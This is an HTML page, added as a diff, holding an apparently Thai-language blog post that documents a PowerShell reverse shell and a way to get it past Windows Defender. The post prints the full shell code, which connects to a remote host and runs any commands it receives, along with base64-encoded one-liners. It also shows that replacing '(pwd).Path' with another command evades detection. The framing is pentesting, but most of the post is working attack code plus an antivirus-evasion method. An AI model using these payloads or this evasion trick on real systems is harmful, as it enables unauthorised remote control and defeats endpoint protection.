@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>What The Fuck Do You Want Windows Defender? :: SUAM — Secret Unorthodox Alien&#39;s Memo</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ @nikhil_mitt โดยมีหน้าตาประมาณนี้ครับ
+$client = New-Object System.Net.Sockets.TCPClient(&amp;#34;192.168.1.110&amp;#34;,1234); $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String ); $sendback2 = $sendback &#43; &amp;#34;PS &amp;#34; &#43; (pwd).Path &#43; &amp;#34;&amp;gt; &amp;#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); เต็ม ๆ อ่านที่ Link นี้นะครับ
+ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://suam-team.github.io/blog/posts/wtf-do-you-want-windows-defender/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://suam-team.github.io/blog/assets/style.css">
+
+
+<link rel="stylesheet" href="https://suam-team.github.io/blog/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://suam-team.github.io/blog/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://suam-team.github.io/blog/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="What The Fuck Do You Want Windows Defender?"/>
+<meta name="twitter:description" content="เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน"/>
+
+
+
+<meta property="og:title" content="What The Fuck Do You Want Windows Defender?" />
+<meta property="og:description" content="เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suam-team.github.io/blog/posts/wtf-do-you-want-windows-defender/" />
+<meta property="article:published_time" content="2020-06-30T23:16:18+07:00" />
+<meta property="article:modified_time" content="2020-06-30T23:16:18+07:00" /><meta property="og:site_name" content="SUAM" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://suam-team.github.io/blog/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">SUAM</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/blog/about">About</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/blog/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="https://suam-team.github.io/blog/posts/wtf-do-you-want-windows-defender/">What The Fuck Do You Want Windows Defender?</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            2020-06-30
+        </span>
+      
+      <span class="post-author">— Written by Bongtrop</span>
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      <p>เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ <code>@nikhil_mitt</code> โดยมีหน้าตาประมาณนี้ครับ</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;192.168.1.110&#34;</span>,1234);
+$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..255|%{0};
+<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+    $sendback2  = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + (pwd).Path + <span style="color:#e6db74">&#34;&gt; &#34;</span>;
+    $sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+};
+$client.Close();
+</code></pre></div><p><a href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html">เต็ม ๆ อ่านที่ Link นี้นะครับ</a></p>
+<p>ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ</p>
+<pre><code>powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADAAIgAsADEAMgAzADQAKQA7ACQAYgA9ACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGQAPQAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZQA9ACQAYgAuAFIAZQBhAGQAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAJABpAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAAsADAALAAkAGUAKQA7ACQAawA9ACgAaQBlAHgAIAAkAGkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAbQA9ACQAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABvAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAG0AKQA7ACQAYgAuAFcAcgBpAHQAZQAoACQAbwAsADAALAAkAG8ALgBMAGUAbgBnAHQAaAApADsAJABiAC4ARgBsAHUAcwBoACgAKQA7AH0AOwAkAGEALgBDAGwAbwBzAGUAKAApADsA
+</code></pre><p>แต่ผลไม่ได้เป็นดังที่หวังหลังจากผมนำไป Execute บน Windows 10 เวอร์ชันล่าสุดโดน Antivirus จับได้ซะงั้น ผมตกใจมากและคิดในใจว่า</p>
+<blockquote>
+<p>OMG แค่โปรแกรมเอาข้อความที่ได้รับจาก TCP มา Eval แล้วส่งกลับ มันจับได้ไงวะเนี่ย</p>
+</blockquote>
+<p>เป็นดังภาพครับ</p>
+<p><img src="https://ggez.cc/img/wtf-do-you-want-windows-defender-1.png" alt="Antivirus Detected"></p>
+<p>ผมเลยลองพยายามหาว่ามันจับจากอะไรพยายามลบคำสั่งต่าง ๆ ไปเรื่อย ๆ จนท้อ แต่ไม่รู้คิดไงเหมือนกัน ไปลบ <code>(pwd).Path</code> ออกจับไม่ได้เฉย Powershell Script ก็จะเป็นประมาณนี้ครับ</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;192.168.1.110&#34;</span>,1234);
+$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..255|%{0};
+<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+    $sendback2  = $sendback + <span style="color:#e6db74">&#34;PS &gt; &#34;</span>;
+    $sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+};
+$client.Close();
+</code></pre></div><p>อ่าวเห้ยคุณ Windows Defender จับแค่คำสั่งความสวยงามนี้หว่า ผมเลยลองแก้เป็นอีกคำสั่งหนึ่งที่มีความสามารถเหมือนกัน ดังนี้</p>
+<p><code>(pwd).Path</code> -&gt; <code>(dir).DirectoryName | Select -Index 0</code></p>
+<p>ก็จะได้ Powershell Script หน้าตาประมาณนี้ครับ</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;192.168.1.110&#34;</span>,1234);
+$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..255|%{0};
+<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2&gt;&amp;1 | Out-String );
+    $sendback2  = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + ((dir).DirectoryName | Select -Index 0) + <span style="color:#e6db74">&#34;&gt; &#34;</span>;
+    $sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+};
+$client.Close();
+</code></pre></div><p>ความยาว Payload หลังจากเอาไป Minify, Encode และทำเป็น One Line ไม่ได้ยาวกว่ากันมากครับ</p>
+<pre><code>powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADAAIgAsADEAMgAzADQAKQA7ACQAYgA9ACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGQAPQAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZQA9ACQAYgAuAFIAZQBhAGQAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAJABpAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAAsADAALAAkAGUAKQA7ACQAawA9ACgAaQBlAHgAIAAkAGkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAbQA9ACQAawAgACsAIAAiAFAAUwAgACIAIAArACAAKAAoAGQAaQByACkALgBEAGkAcgBlAGMAdABvAHIAeQBOAGEAbQBlACAAfAAgAFMAZQBsAGUAYwB0ACAALQBJAG4AZABlAHgAIAAwACkAIAArACAAIgA+ACAAIgA7ACQAbwA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABtACkAOwAkAGIALgBXAHIAaQB0AGUAKAAkAG8ALAAwACwAJABvAC4ATABlAG4AZwB0AGgAKQA7ACQAYgAuAEYAbAB1AHMAaAAoACkAOwB9ADsAJABhAC4AQwBsAG8AcwBlACgAKQA7AA==
+</code></pre><p>หลังจากเอาไป Execute ก็ Happy Ending ครับ ดังรูป</p>
+<p><img src="https://ggez.cc/img/wtf-do-you-want-windows-defender-2.png" alt="Noob Antivirus"></p>
+<p>จบเรื่องนี้ผมก็ยังไม่เข้าใจคุณ Windows Defender ว่าเขาต้องการอะไรจากน้อง Reverse Shell ของผม</p>
+<ol>
+<li>คุณ Windows Defender จะ Detect ทำไมกับโปรแกรมรับข้อความจาก TCP มา Eval แล้วส่งกลับ</li>
+<li>คุณ Windows Defender จะ Detect จาก <code>(pwd).Path</code> ไม่ได้นะครับ มันไม่ได้เป็นสาระสำคัญของ Script เลย</li>
+<li>อะไรกันคับเนี่ย คุณ Windows Defender คุณคิดอะไรอยู่ ผมงงไปหมดแล้ว</li>
+</ol>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="https://suam-team.github.io/blog/posts/create-a-blog-post-with-hugo/">
+                  <span class="button__text">Create a Blog Post with Hugo</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+    
+
+    
+      
+        
+
+      
+    
+    
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://suam-team.github.io/blog/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">SUAM</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://suam-team.github.io/blog/assets/main.js"></script>
+<script src="https://suam-team.github.io/blog/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
